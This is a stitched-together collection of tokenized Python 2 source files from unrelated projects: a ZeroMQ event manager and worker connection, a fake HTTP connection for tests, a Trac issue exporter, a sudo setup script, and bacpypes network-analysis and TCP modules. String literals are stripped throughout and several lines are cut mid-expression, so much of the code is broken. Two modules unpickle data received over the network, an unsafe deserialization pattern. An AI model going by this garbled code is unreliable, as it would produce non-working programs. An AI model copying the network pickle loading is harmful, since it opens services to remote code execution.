self . assertEquals ( instance2 . value ( ) , 3 ) \n 
self . assertEquals ( ( yield pool . await_transaction ( lambda i : i . increment ( ) ) ) , 4 ) \n 
self . assertEquals ( ( yield pool . await_transaction ( lambda i : i . increment ( ) ) ) , 4 ) \n 
~~ loop = IOLoop ( ) \n 
loop . make_current ( ) \n 
loop . run_sync ( yield_tasks ) \n 
self . assertEquals ( instance1 . value ( ) , 4 ) \n 
self . assertEquals ( instance2 . value ( ) , 4 ) \n 
~~ ~~ \n 
\n 
import cPickle as pickle \n 
from threading import Thread \n 
from collections import deque \n 
from tornado . web import * \n 
from tornado . ioloop import IOLoop \n 
from traceback import format_exc \n 
from tornado . options import options \n 
import zmq \n 
import logging \n 
import zlib \n 
from random import choice , shuffle \n 
\n 
class EventManager ( ) : \n 
~~~ \n 
\n 
def __init__ ( self , address = None ) : \n 
~~~ self . __handlers = { } \n 
self . address = address \n 
self . __zmq_context = zmq . Context ( ) \n 
self . __remote_servers = { } \n 
self . __thread = None \n 
self . __queued_servers = deque ( ) \n 
\n 
~~ def register_server ( self , address ) : \n 
~~~ \n 
if address in self . __remote_servers : \n 
~~~ raise Exception ( , address ) \n 
~~ socket = self . __zmq_context . socket ( zmq . PUSH ) \n 
socket . connect ( address ) \n 
self . __remote_servers [ address ] = socket \n 
self . refresh_server_queue ( ) \n 
\n 
~~ def remove_server ( self , address ) : \n 
~~~ \n 
del self . __remote_servers [ address ] \n 
self . refresh_server_queue ( ) \n 
\n 
~~ def remove_all_servers ( self ) : \n 
~~~ \n 
self . __remote_servers . clear ( ) \n 
self . refresh_server_queue ( ) \n 
\n 
~~ def refresh_server_queue ( self ) : \n 
~~~ \n 
self . __queued_servers . clear ( ) \n 
self . __queued_servers . extend ( self . __remote_servers . itervalues ( ) ) \n 
shuffle ( self . __queued_servers ) \n 
\n 
~~ def register_handler ( self , event_name , event_handler , run_on_main_loop = False , request_handler = None ~~~ \n 
if not event_name in self . __handlers : \n 
~~~ self . __handlers [ event_name ] = set ( ) \n 
~~ handler_tuple = ( event_handler , run_on_main_loop , request_handler , persist ) \n 
self . __handlers [ event_name ] . add ( handler_tuple ) \n 
return ( event_name , handler_tuple ) \n 
\n 
~~ def remove_handler ( self , handler_sig ) : \n 
~~~ \n 
self . __handlers [ handler_sig [ 0 ] ] . discard ( handler_sig [ 1 ] ) \n 
\n 
~~ def start_listening ( self ) : \n 
~~~ \n 
if self . __thread : \n 
~~~ return \n 
~~ def receive ( ) : \n 
~~~ context = zmq . Context ( ) \n 
socket = context . socket ( zmq . PULL ) \n 
socket . bind ( self . address ) \n 
while True : \n 
~~~ event = pickle . loads ( zlib . decompress ( socket . recv ( ) ) ) \n 
event_name = event [ ] \n 
event_args = event [ ] \n 
if event_name in self . __handlers : \n 
~~~ handlers = self . __handlers [ event_name ] \n 
for handler in list ( handlers ) : \n 
~~~ if not handler [ 3 ] : \n 
~~~ handlers . remove ( handler ) \n 
~~ try : \n 
~~~ if handler [ 2 ] and handler [ 2 ] . _finished : \n 
~~~ continue \n 
~~ if handler [ 1 ] : \n 
~~~ ( lambda h : IOLoop . instance ( ) . add_callback ( lambda : h [ 0 ] ( event_args ) ) ) ( handler ) \n 
~~ else : \n 
~~~ handler [ 0 ] ( event_args ) \n 
~~ ~~ except Exception as e : \n 
~~~ logging . error ( format_exc ( ) ) \n 
~~ ~~ ~~ ~~ ~~ self . __thread = Thread ( target = receive ) \n 
self . __thread . daemon = True \n 
self . __thread . start ( ) \n 
\n 
~~ def send_to_server ( self , address , event_name , event_args ) : \n 
~~~ \n 
event = { : event_name , : event_args } \n 
event_data = zlib . compress ( pickle . dumps ( event ) ) \n 
self . __remote_servers [ address ] . send ( event_data ) \n 
\n 
~~ def send ( self , event_name , event_args , broadcast = True ) : \n 
~~~ \n 
if not self . __remote_servers : \n 
~~~ return \n 
~~ event = { : event_name , : event_args } \n 
event_data = zlib . compress ( pickle . dumps ( event ) ) \n 
if not broadcast : \n 
~~~ self . __queued_servers [ 0 ] . send ( event_data ) \n 
self . __queued_servers . rotate ( - 1 ) \n 
return \n 
~~ for socket in self . __queued_servers : \n 
~~~ socket . send ( event_data ) \n 
\n 
~~ ~~ @ classmethod \n 
def instance ( cls ) : \n 
~~~ \n 
if not hasattr ( cls , ) : \n 
~~~ cls . _instance = cls ( ) \n 
~~ return cls . _instance \n 
~~ ~~ import toto \n 
import cPickle as pickle \n 
import zlib \n 
import logging \n 
from threading import Thread \n 
from tornado . options import options \n 
from tornado . gen import Task \n 
from collections import deque \n 
from time import time \n 
from uuid import uuid4 \n 
from traceback import format_exc \n 
from toto . options import safe_define \n 
\n 
safe_define ( "worker_compression_module" , type = str , help = "The module to use for compressing and decompressing messages to workers. The module must have \'decompress\' and \'compress\' methods. If not specified, no compression will be used. Only the default instance will be affected" safe_define ( "worker_serialization_module" , type = str , help = "The module to use for serializing and deserializing messages to workers. The module must have \'dumps\' and \'loads\' methods. If not specified, cPickle will be used. Only the default instance will be affected" safe_define ( "worker_serialization_mime" , type = str , default = , help = "Used by HttpWorkerConnection in its Content-Type header." safe_define ( "worker_timeout" , default = 10.0 , help = "The default worker (instance()) will wait at least this many seconds before retrying a request (if retry is true), or timing out (if retry is false). Negative values will never retry or timeout. Note: This abs(value) is also the minimum resolution of any request-specific timeouts. Must not be 0." safe_define ( "worker_auto_retry" , default = False , help = "If True, the default timeout behavior of a worker RPC will be to retry instead of failing when the timeout is reached." safe_define ( "worker_retry_count" , default = 0 , help = "The maximum number of times to retry a request after timeout. Used by HttpWorkerConnection instead of worker_auto_retry." safe_define ( "worker_address" , default = , help = "This is the address that toto.workerconnection.invoke(method, params) will send tasks too (As specified in the worker conf file). A comma separated list may be used to round-robin load balance tasks between workers." safe_define ( "worker_transport" , default = , help = "Either zmq or http to select which transport to use for worker communication." \n 
WORKER_SOCKET_CONNECT = \n 
WORKER_SOCKET_DISCONNECT = \n 
\n 
class WorkerConnection ( object ) : \n 
~~~ \n 
\n 
def __getattr__ ( self , path ) : \n 
~~~ return WorkerInvocation ( path , self ) \n 
\n 
~~ def log_error ( self , error ) : \n 
~~~ logging . error ( repr ( error ) ) \n 
\n 
~~ def enable_traceback_logging ( self ) : \n 
~~~ from new import instancemethod \n 
from traceback import format_exc \n 
def log_error ( self , e ) : \n 
~~~ logging . error ( format_exc ( ) ) \n 
~~ self . log_error = instancemethod ( log_error , self ) \n 
\n 
~~ @ classmethod \n 
def instance ( cls ) : \n 
~~~ \n 
if not hasattr ( cls , ) : \n 
~~~ if options . worker_transport == : \n 
~~~ from toto . httpworkerconnection import HTTPWorkerConnection \n 
cls . _instance = HTTPWorkerConnection . instance ( ) \n 
~~ else : \n 
~~~ from toto . zmqworkerconnection import ZMQWorkerConnection \n 
cls . _instance = ZMQWorkerConnection . instance ( ) \n 
~~ ~~ return cls . _instance \n 
\n 
~~ ~~ class WorkerInvocation ( object ) : \n 
\n 
~~~ def __init__ ( self , path , connection ) : \n 
~~~ self . _path = path \n 
self . _connection = connection \n 
\n 
~~ def __call__ ( self , * args , ** kwargs ) : \n 
~~~ return self . _connection . invoke ( self . _path , * args , ** kwargs ) \n 
\n 
~~ def __getattr__ ( self , path ) : \n 
~~~ return getattr ( self . _connection , self . _path + + path ) \n 
~~ ~~ from . import multiarray \n 
\n 
__all__ = [ ] #!/usr/bin/python2.4 \n 
# Copyright 2008 Google Inc. All Rights Reserved. \n 
\n 
"""A fake HTTP connection for testing""" \n 
\n 
__author__ = \n 
\n 
import urllib \n 
from pyactiveresource import connection \n 
from pyactiveresource import formats \n 
\n 
class Error ( Exception ) : \n 
~~~ """The base exception class for this module.""" \n 
\n 
\n 
~~ class FakeConnection ( object ) : \n 
~~~ """A fake HTTP connection for testing.\n    \n    Inspired by ActiveResource\'s HttpMock class. This class is designed to\n    take a list of inputs and their corresponding outputs.\n    \n    Inputs will be matched on the method, path, query and data arguments\n    \n    Example:\n    >>> connection = FakeConnection()\n    >>> body = \'<?xml ... />\'\n    >>> connection.respond_to(\'get\', \'/foos/1.xml\', None, None, body)\n    >>> class Foo(resource.Resource):\n    ...     _site = \'http://localhost/\'\n    ...\n    >>> Foo._connection_obj = connection\n    >>> Foo.find(1)\n    foo(1)\n    """ \n 
def __init__ ( self , format = formats . XMLFormat ) : \n 
~~~ """Constructor for FakeConnection object.""" \n 
self . format = format \n 
self . _request_map = { } \n 
self . _debug_only = False \n 
\n 
~~ def _split_path ( self , path ) : \n 
~~~ """Return the path and the query string as a dictionary.""" \n 
path_only , query_string = urllib . splitquery ( path ) \n 
if query_string : \n 
~~~ query_dict = dict ( [ i . split ( ) for i in query_string . split ( ) ] ) \n 
~~ else : \n 
~~~ query_dict = { } \n 
~~ return path_only , query_dict \n 
\n 
~~ def debug_only ( self , debug = True ) : \n 
~~~ self . _debug_only = debug \n 
\n 
~~ def respond_to ( self , method , path , headers , data , body , \n 
response_headers = None ) : \n 
~~~ """Set the response for a given request.\n        \n        Args:\n            method: The http method (e.g. \'get\', \'put\' etc.).\n            path: The path being requested (e.g. \'/collection/id.xml\')\n            headers: Dictionary of headers passed along with the request.\n            data: The data being passed in as the request body.\n            body: The string that should be returned for a matching request.\n            response_headers: The headers returned for a matching request\n        Returns:\n            None\n        """ \n 
path_only , query = self . _split_path ( path ) \n 
if response_headers is None : \n 
~~~ response_headers = { } \n 
~~ self . _request_map . setdefault ( method , [ ] ) . append ( \n 
( ( path_only , query , headers , data ) , ( body , response_headers ) ) ) \n 
\n 
~~ def _lookup_response ( self , method , path , headers , data ) : \n 
~~~ path_only , query = self . _split_path ( path ) \n 
for key , value in self . _request_map . get ( method , { } ) : \n 
~~~ if key == ( path_only , query , headers , data ) : \n 
~~~ response_body , response_headers = value \n 
return connection . Response ( 200 , response_body , response_headers ) \n 
~~ ~~ raise Error ( % \n 
( path , headers , data ) ) \n 
\n 
~~ def get ( self , path , headers = None ) : \n 
~~~ """Perform an HTTP get request.""" \n 
return self . format . decode ( \n 
self . _lookup_response ( , path , headers , None ) . body ) \n 
\n 
~~ def post ( self , path , headers = None , data = None ) : \n 
~~~ """Perform an HTTP post request.""" \n 
return self . _lookup_response ( , path , headers , data ) \n 
\n 
~~ def put ( self , path , headers = None , data = None ) : \n 
~~~ """Perform an HTTP post request.""" \n 
return self . _lookup_response ( , path , headers , data ) \n 
\n 
~~ def delete ( self , path , headers = None ) : \n 
~~~ """Perform an HTTP delete request.""" \n 
return self . _lookup_response ( , path , headers , None ) \n 
~~ ~~ from trac . env import Environment \n 
from trac . attachment import Attachment \n 
from tracLib import * \n 
from ConfigParser import ConfigParser \n 
import tracLib \n 
import tracLib . timetracking \n 
\n 
\n 
class Client ( object ) : \n 
~~~ def __init__ ( self , env_path ) : \n 
~~~ self . env_path = env_path \n 
self . env = Environment ( env_path ) \n 
self . db_cnx = self . env . get_db_cnx ( ) \n 
self . _registered_users_logins = [ ] \n 
self . _timetracking_plugins = self . _get_timetracking_plugins ( ) \n 
\n 
~~ def _get_timetracking_plugins ( self ) : \n 
~~~ plugins = { } \n 
if tracLib . SUPPORT_TIME_TRACKING == : \n 
~~~ for plugin in tracLib . timetracking . plugins : \n 
~~~ plugin_name = plugin . get_name ( ) \n 
for com_name , com_enabled in self . env . _component_rules . items ( ) : \n 
~~~ if com_name . startswith ( plugin_name ) and com_enabled and plugin_name not in plugins ~~~ plugins [ plugin_name ] = plugin ( self . env ) \n 
~~ ~~ ~~ ~~ else : \n 
~~~ for plugin in tracLib . timetracking . plugins : \n 
~~~ plugin_name = plugin . get_name ( ) \n 
if plugin_name == tracLib . SUPPORT_TIME_TRACKING : \n 
~~~ plugins [ plugin_name ] = plugin ( self . env ) \n 
break ; \n 
~~ ~~ ~~ for plugin_name in plugins . keys ( ) : \n 
~~~ print "Plugin \'%s\' will be used to get workitems." % plugin_name \n 
~~ return plugins . values ( ) \n 
\n 
~~ def get_project_description ( self ) : \n 
~~~ return self . env . project_description \n 
\n 
~~ def get_users ( self ) : \n 
~~~ result = self . env . get_known_users ( ) \n 
trac_users = list ( [ ] ) \n 
for user in result : \n 
~~~ user_login = user [ 0 ] . lower ( ) \n 
if user_login in self . _registered_users_logins : \n 
~~~ continue \n 
~~ u = TracUser ( user_login ) \n 
u . email = user [ 2 ] \n 
trac_users . append ( u ) \n 
self . _registered_users_logins . append ( user_login ) \n 
\n 
# all of them were returned by "get_known_users" method \n 
~~ if not tracLib . ACCEPT_NON_AUTHORISED_USERS : \n 
~~~ return trac_users \n 
# here we must to get component owners, issue reporters, owners and attachment authors \n 
# that are not registered users \n 
~~ user_fields = [ ( "owner" , "component" ) , ( "reporter" , "ticket" ) , ( "owner" , "ticket" ) , ( "author" first = True \n 
request = "" \n 
for column_name , table_name in user_fields : \n 
~~~ if first : \n 
~~~ first = False \n 
~~ else : \n 
~~~ request += "UNION " \n 
~~ request += "SELECT DISTINCT lower(%s) FROM %s " % ( column_name , table_name ) \n 
~~ cursor = self . db_cnx . cursor ( ) \n 
cursor . execute ( request ) \n 
for row in cursor : \n 
~~~ if row [ 0 ] not in self . _registered_users_logins : \n 
~~~ trac_user = self . _get_non_authorised_user ( row [ 0 ] ) \n 
if trac_user is not None : \n 
~~~ trac_users . append ( trac_user ) \n 
self . _registered_users_logins . append ( trac_user . name ) \n 
~~ ~~ ~~ return trac_users \n 
\n 
~~ def _get_non_authorised_user ( self , user_name ) : \n 
~~~ if user_name is None : \n 
~~~ return None \n 
# non authorized users in trac are stored like this "name <email_address>" \n 
~~ start = user_name . find ( "<" ) \n 
end = user_name . rfind ( ">" ) \n 
\n 
if ( start > - 1 ) and ( end > start + 1 ) : \n 
~~~ if user_name . find ( "@" , start , end ) > 0 : \n 
~~~ user = TracUser ( user_name [ start + 1 : end ] . replace ( " " , "_" ) ) \n 
user . email = user_name [ start + 1 : end ] . replace ( " " , "_" ) \n 
return user \n 
~~ ~~ return None \n 
\n 
~~ def _get_user_login ( self , user_name ) : \n 
~~~ if user_name is None : \n 
~~~ return None \n 
~~ if user_name in self . _registered_users_logins : \n 
~~~ return user_name \n 
~~ if not tracLib . ACCEPT_NON_AUTHORISED_USERS : \n 
~~~ return None \n 
~~ user = self . _get_non_authorised_user ( user_name ) \n 
if ( user is None ) or ( user . name not in self . _registered_users_logins ) : \n 
~~~ return None \n 
~~ return user . name \n 
\n 
~~ def get_severities ( self ) : \n 
~~~ return self . _get_data_from_enum ( "severity" ) \n 
\n 
~~ def get_issue_types ( self ) : \n 
~~~ return self . _get_data_from_enum ( "ticket_type" ) \n 
\n 
~~ def get_issue_priorities ( self ) : \n 
~~~ return self . _get_data_from_enum ( "priority" ) \n 
\n 
~~ def get_issue_resolutions ( self ) : \n 
~~~ return [ TracResolution ( name ) for name in self . _get_data_from_enum ( "resolution" ) ] \n 
\n 
~~ def get_components ( self ) : \n 
~~~ cursor = self . db_cnx . cursor ( ) \n 
cursor . execute ( "SELECT name, owner, description FROM component" ) \n 
trac_components = list ( [ ] ) \n 
for row in cursor : \n 
~~~ component = TracComponent ( row [ 0 ] ) \n 
component . owner = self . _get_user_login ( component . owner ) \n 
if row [ 2 ] is not None : \n 
~~~ component . description = row [ 2 ] \n 
~~ trac_components . append ( component ) \n 
~~ return trac_components \n 
\n 
~~ def get_versions ( self ) : \n 
~~~ cursor = self . db_cnx . cursor ( ) \n 
cursor . execute ( "SELECT name, time, description FROM version" ) \n 
trac_versions = list ( [ ] ) \n 
for row in cursor : \n 
~~~ version = TracVersion ( row [ 0 ] ) \n 
if row [ 1 ] : \n 
~~~ version . time = to_unix_time ( row [ 1 ] ) \n 
~~ if row [ 2 ] is not None : \n 
~~~ version . description = row [ 2 ] \n 
~~ trac_versions . append ( version ) \n 
~~ return trac_versions \n 
\n 
~~ def get_issues ( self ) : \n 
~~~ cursor = self . db_cnx . cursor ( ) \n 
cursor . execute ( "SELECT id, type, time, changetime, component, severity, priority, owner, reporter," "cc, version, status, resolution, summary, description, keywords FROM ticket" trac_issues = list ( [ ] ) \n 
for row in cursor : \n 
~~~ issue = TracIssue ( row [ 0 ] ) \n 
issue . time = to_unix_time ( row [ 2 ] ) \n 
issue . changetime = to_unix_time ( row [ 3 ] ) \n 
issue . reporter = self . _get_user_login ( row [ 8 ] ) \n 
if row [ 9 ] is not None : \n 
~~~ cc = row [ 9 ] . split ( "," ) \n 
for c in cc : \n 
~~~ if len ( c ) > 0 : \n 
~~~ cc_name = self . _get_user_login ( c . strip ( ) ) \n 
if cc_name is not None : \n 
~~~ issue . cc . add ( cc_name ) \n 
~~ ~~ ~~ ~~ issue . summary = row [ 13 ] \n 
issue . description = row [ 14 ] \n 
issue . custom_fields [ "Type" ] = row [ 1 ] \n 
issue . custom_fields [ "Component" ] = row [ 4 ] \n 
issue . custom_fields [ "Severity" ] = row [ 5 ] \n 
issue . custom_fields [ "Priority" ] = row [ 6 ] \n 
issue . custom_fields [ "Owner" ] = self . _get_user_login ( row [ 7 ] ) \n 
issue . custom_fields [ "Version" ] = row [ 10 ] \n 
issue . custom_fields [ "Status" ] = row [ 11 ] \n 
issue . custom_fields [ "Resolution" ] = row [ 12 ] \n 
if row [ 15 ] is not None : \n 
~~~ keywords = row [ 15 ] . rsplit ( "," ) \n 
for kw in keywords : \n 
~~~ if len ( kw ) > 0 : \n 
~~~ issue . keywords . add ( kw . strip ( ) ) \n 
#getting custom fields from ticket_custom table \n 
~~ ~~ ~~ custom_field_cursor = self . db_cnx . cursor ( ) \n 
custom_field_cursor . execute ( "SELECT name, value FROM ticket_custom WHERE ticket=%s" , ( str for cf in custom_field_cursor : \n 
~~~ issue . custom_fields [ cf [ 0 ] . capitalize ( ) ] = cf [ 1 ] \n 
# getting attachments from attachment table \n 
~~ attachment_cursor = self . db_cnx . cursor ( ) \n 
attachment_cursor . execute ( "SELECT filename, size, time, description, author FROM attachment WHERE " "type = %s AND id = %s" , ( "ticket" , str ( issue . id ) ) ) \n 
#path = self.env_path + "/attachments/ticket/" + str(issue.id) + "/" \n 
for elem in attachment_cursor : \n 
#at = TracAttachment(path + elem[0]) \n 
~~~ at = TracAttachment ( Attachment . _get_path ( self . env . path , , str ( issue . id ) , elem at . name = elem [ 0 ] \n 
at . size = elem [ 1 ] \n 
at . time = to_unix_time ( elem [ 2 ] ) \n 
at . description = elem [ 3 ] \n 
at . author_name = elem [ 4 ] \n 
issue . attachment . add ( at ) \n 
~~ trac_issues . append ( issue ) \n 
#getting comments \n 
change_cursor = self . db_cnx . cursor ( ) \n 
change_cursor . execute ( "SELECT time, author, newvalue, oldvalue FROM ticket_change WHERE ticket = %s AND field = %s ORDER BY time DESC" for elem in change_cursor : \n 
~~~ if ( elem [ 2 ] is None ) or ( not len ( elem [ 2 ] . lstrip ( ) ) ) : \n 
~~~ continue \n 
~~ comment = TracComment ( to_unix_time ( elem [ 0 ] ) ) \n 
comment . author = str ( elem [ 1 ] ) \n 
comment . content = unicode ( elem [ 2 ] ) \n 
comment . id = elem [ 3 ] \n 
issue . comments . add ( comment ) \n 
#getting workitems \n 
~~ for ttp in self . _timetracking_plugins : \n 
~~~ issue . workitems . update ( set ( ttp [ row [ 0 ] ] ) ) \n 
~~ ~~ return trac_issues \n 
\n 
\n 
~~ def get_custom_fields_declared ( self ) : \n 
~~~ ini_file_path = self . env_path + "/conf/trac.ini" \n 
parser = ConfigParser ( ) \n 
parser . read ( ini_file_path ) \n 
if not ( "ticket-custom" in parser . sections ( ) ) : \n 
~~~ return set ( [ ] ) \n 
~~ result = parser . items ( "ticket-custom" ) \n 
items = dict ( [ ] ) \n 
for elem in result : \n 
~~~ items [ elem [ 0 ] ] = elem [ 1 ] \n 
\n 
~~ keys = items . keys ( ) \n 
custom_fields = list ( [ ] ) \n 
for k in keys : \n 
~~~ if not ( "." in k ) : \n 
~~~ field = TracCustomFieldDeclaration ( k . capitalize ( ) ) \n 
field . type = items [ k ] \n 
options_key = k + ".options" \n 
if options_key in items : \n 
~~~ opts_str = items [ options_key ] \n 
opts = opts_str . rsplit ( "|" ) \n 
for o in opts : \n 
~~~ field . options . append ( o ) \n 
~~ ~~ value_key = k + ".value" \n 
if value_key in items : \n 
~~~ field . value = items [ value_key ] \n 
~~ label_key = k + ".label" \n 
if label_key in items : \n 
~~~ field . label = items [ label_key ] \n 
~~ custom_fields . append ( field ) \n 
\n 
~~ ~~ return custom_fields \n 
\n 
~~ def _get_data_from_enum ( self , type_name ) : \n 
~~~ cursor = self . db_cnx . cursor ( ) \n 
cursor . execute ( "SELECT name, value FROM enum WHERE type=%s" , ( type_name , ) ) \n 
return [ row [ 0 ] for row in cursor ] \n 
~~ ~~ """Executable documentation about beautifulsoup.""" \n 
#!/usr/bin/env python \n 
\n 
import os \n 
\n 
os . system ( "sudo python setup.py install" ) \n 
#!/usr/bin/python \n 
\n 
"""\nSummarize Who-Is-Router-To-Network Notifications\n""" \n 
\n 
import sys \n 
from collections import defaultdict \n 
\n 
from bacpypes . debugging import Logging , function_debugging , ModuleLogger \n 
from bacpypes . consolelogging import ConsoleLogHandler \n 
\n 
from bacpypes . pdu import Address \n 
from bacpypes . analysis import trace , strftimestamp , Tracer \n 
from bacpypes . npdu import WhoIsRouterToNetwork \n 
\n 
# some debugging \n 
_debug = 0 \n 
_log = ModuleLogger ( globals ( ) ) \n 
\n 
# globals \n 
filterSource = None \n 
filterDestination = None \n 
filterHost = None \n 
\n 
# dictionary of requests \n 
requests = defaultdict ( int ) \n 
networks = defaultdict ( list ) \n 
\n 
# \n 
#   Match \n 
# \n 
\n 
@ function_debugging \n 
def Match ( addr1 , addr2 ) : \n 
~~~ """Return true iff addr1 matches addr2.""" \n 
if _debug : Match . _debug ( "Match %r %r" , addr1 , addr2 ) \n 
\n 
if ( addr2 . addrType == Address . localBroadcastAddr ) : \n 
# match any local station \n 
~~~ return ( addr1 . addrType == Address . localStationAddr ) or ( addr1 . addrType == Address . localBroadcastAddr ~~ elif ( addr2 . addrType == Address . localStationAddr ) : \n 
# match a specific local station \n 
~~~ return ( addr1 . addrType == Address . localStationAddr ) and ( addr1 . addrAddr == addr2 . addrAddr ) \n 
~~ elif ( addr2 . addrType == Address . remoteBroadcastAddr ) : \n 
# match any remote station or remote broadcast on a matching network \n 
~~~ return ( ( addr1 . addrType == Address . remoteStationAddr ) or ( addr1 . addrType == Address . remoteBroadcastAddr and ( addr1 . addrNet == addr2 . addrNet ) \n 
~~ elif ( addr2 . addrType == Address . remoteStationAddr ) : \n 
# match a specific remote station \n 
~~~ return ( addr1 . addrType == Address . remoteStationAddr ) and ( addr1 . addrNet == addr2 . addrNet ) and ( addr1 . addrAddr == addr2 . addrAddr ) \n 
~~ elif ( addr2 . addrType == Address . globalBroadcastAddr ) : \n 
# match a global broadcast address \n 
~~~ return ( addr1 . addrType == Address . globalBroadcastAddr ) \n 
~~ else : \n 
~~~ raise RuntimeError , "invalid match combination" \n 
\n 
# \n 
#   WhoIsRouterToNetworkSummary \n 
# \n 
\n 
~~ ~~ class WhoIsRouterToNetworkSummary ( Tracer , Logging ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
~~~ if _debug : IAmRouterToNetworkSummary . _debug ( "__init__" ) \n 
Tracer . __init__ ( self , self . Filter ) \n 
\n 
~~ def Filter ( self , pkt ) : \n 
~~~ if _debug : WhoIsRouterToNetworkSummary . _debug ( "Filter %r" , pkt ) \n 
global requests , networks \n 
\n 
# check for the packet type \n 
if not isinstance ( pkt , WhoIsRouterToNetwork ) : \n 
~~~ return \n 
\n 
# apply the filters \n 
~~ if filterSource : \n 
~~~ if not Match ( pkt . pduSource , filterSource ) : \n 
~~~ if _debug : WhoIsRouterToNetworkSummary . _debug ( "    - source filter fail" ) \n 
return \n 
~~ ~~ if filterDestination : \n 
~~~ if not Match ( pkt . pduDestination , filterDestination ) : \n 
~~~ if _debug : WhoIsRouterToNetworkSummary . _debug ( "    - destination filter fail" ) \n 
return \n 
~~ ~~ if filterHost : \n 
~~~ if ( not Match ( pkt . pduSource , filterHost ) ) and ( not Match ( pkt . pduDestination , filterHost ) ~~~ if _debug : WhoIsRouterToNetworkSummary . _debug ( "    - host filter fail" ) \n 
return \n 
\n 
# count it \n 
~~ ~~ requests [ pkt . pduSource ] += 1 \n 
networks [ pkt . pduSource ] . append ( pkt . wirtnNetwork ) \n 
\n 
# \n 
#   __main__ \n 
# \n 
\n 
~~ ~~ try : \n 
~~~ if ( in sys . argv ) : \n 
~~~ indx = sys . argv . index ( ) \n 
for i in range ( indx + 1 , len ( sys . argv ) ) : \n 
~~~ ConsoleLogHandler ( sys . argv [ i ] ) \n 
~~ del sys . argv [ indx : ] \n 
\n 
~~ if _debug : _log . debug ( "initialization" ) \n 
\n 
# check for src \n 
if ( in sys . argv ) : \n 
~~~ i = sys . argv . index ( ) \n 
filterSource = Address ( sys . argv [ i + 1 ] ) \n 
if _debug : _log . debug ( "    - filterSource: %r" , filterSource ) \n 
del sys . argv [ i : i + 2 ] \n 
\n 
# check for dest \n 
~~ if ( in sys . argv ) : \n 
~~~ i = sys . argv . index ( ) \n 
filterDestination = Address ( sys . argv [ i + 1 ] ) \n 
if _debug : _log . debug ( "    - filterDestination: %r" , filterDestination ) \n 
del sys . argv [ i : i + 2 ] \n 
\n 
# check for host \n 
~~ if ( in sys . argv ) : \n 
~~~ i = sys . argv . index ( ) \n 
filterHost = Address ( sys . argv [ i + 1 ] ) \n 
if _debug : _log . debug ( "    - filterHost: %r" , filterHost ) \n 
del sys . argv [ i : i + 2 ] \n 
\n 
# trace the file(s) \n 
~~ for fname in sys . argv [ 1 : ] : \n 
~~~ trace ( fname , [ WhoIsRouterToNetworkSummary ] ) \n 
\n 
# sort the result, descending order by count \n 
~~ items = requests . items ( ) \n 
items . sort ( lambda x , y : cmp ( y [ 1 ] , x [ 1 ] ) ) \n 
\n 
# print everything out \n 
print "%-20s %5s" % ( "Address" , "Count" ) \n 
for key , count in items : \n 
~~~ print "%-20s %5d" % ( key , count ) \n 
\n 
# count the number of times of each network \n 
net_count = defaultdict ( int ) \n 
for net in networks [ key ] : \n 
~~~ net_count [ net ] += 1 \n 
\n 
# sort descending \n 
~~ net_count = net_count . items ( ) \n 
net_count . sort ( lambda x , y : cmp ( y [ 1 ] , x [ 1 ] ) ) \n 
\n 
for net , count in net_count : \n 
~~~ print "    %5d %5d" % ( net , count ) \n 
\n 
~~ ~~ ~~ except KeyboardInterrupt : \n 
~~~ pass \n 
~~ except Exception , e : \n 
~~~ _log . exception ( "an error has occurred: %s" , e ) \n 
~~ finally : \n 
~~~ if _debug : _log . debug ( "finally" ) \n 
\n 
#!/usr/bin/python \n 
\n 
~~ """\nTCP Communications Module\n""" \n 
\n 
import asyncore \n 
import socket \n 
import cPickle as pickle \n 
from time import time as _time , sleep as _sleep \n 
from StringIO import StringIO \n 
\n 
from . debugging import ModuleLogger , DebugContents , bacpypes_debugging \n 
\n 
from . core import deferred \n 
from . task import FunctionTask , OneShotFunction \n 
from . comm import PDU , Client , Server \n 
from . comm import ServiceAccessPoint , ApplicationServiceElement \n 
\n 
# some debugging \n 
_debug = 0 \n 
_log = ModuleLogger ( globals ( ) ) \n 
\n 
# globals \n 
REBIND_SLEEP_INTERVAL = 2.0 \n 
\n 
# \n 
#   PickleActorMixIn \n 
# \n 
\n 
class PickleActorMixIn : \n 
\n 
~~~ def __init__ ( self , * args ) : \n 
~~~ if _debug : PickleActorMixIn . _debug ( "__init__ %r" , args ) \n 
super ( PickleActorMixIn , self ) . __init__ ( * args ) \n 
\n 
# keep an upstream buffer \n 
self . pickleBuffer = \n 
\n 
~~ def indication ( self , pdu ) : \n 
~~~ if _debug : PickleActorMixIn . _debug ( "indication %r" , pdu ) \n 
\n 
# pickle the data \n 
pdu . pduData = pickle . dumps ( pdu . pduData ) \n 
\n 
# continue as usual \n 
super ( PickleActorMixIn , self ) . indication ( pdu ) \n 
\n 
~~ def response ( self , pdu ) : \n 
~~~ if _debug : PickleActorMixIn . _debug ( "response %r" , pdu ) \n 
\n 
# add the data to our buffer \n 
self . pickleBuffer += pdu . pduData \n 
\n 
# build a file-like object around the buffer \n 
strm = StringIO ( self . pickleBuffer ) \n 
\n 
pos = 0 \n 
while ( pos < strm . len ) : \n 
~~~ try : \n 
# try to load something \n 
~~~ msg = pickle . load ( strm ) \n 
~~ except : \n 
~~~ break \n 
\n 
# got a message \n 
~~ rpdu = PDU ( msg ) \n 
rpdu . update ( pdu ) \n 
\n 
super ( PickleActorMixIn , self ) . response ( rpdu ) \n 
\n 
# see where we are \n 
pos = strm . tell ( ) \n 
\n 
# save anything left over, if there is any \n 
~~ if ( pos < strm . len ) : \n 
~~~ self . pickleBuffer = self . pickleBuffer [ pos : ] \n 
~~ else : \n 
~~~ self . pickleBuffer = \n 
\n 
~~ ~~ ~~ bacpypes_debugging ( PickleActorMixIn ) \n 
\n 
# \n 
#   TCPClient \n 
# \n 
#   This class is a mapping between the client/server pattern and the \n 
#   socket API.  The ctor is given the address to connect as a TCP \n 
#   client.  Because objects of this class sit at the bottom of a \n 
#   protocol stack they are accessed as servers. \n 
# \n 
\n 
class TCPClient ( asyncore . dispatcher ) : \n 
\n 
~~~ def __init__ ( self , peer ) : \n 
~~~ if _debug : TCPClient . _debug ( "__init__ %r" , peer ) \n 
asyncore . dispatcher . __init__ ( self ) \n 
\n 
# ask the dispatcher for a socket \n 
self . create_socket ( socket . AF_INET , socket . SOCK_STREAM ) \n 
\n 
# save the peer \n 
self . peer = peer \n 
\n 
# create a request buffer \n 
self . request = \n 
\n 
# hold the socket error if there was one \n 
self . socketError = None \n 
\n 
# try to connect the socket \n 
if _debug : TCPClient . _debug ( "    - try to connect" ) \n 
self . connect ( peer ) \n 
if _debug : TCPClient . _debug ( "    - connected (maybe)" ) \n 
\n 
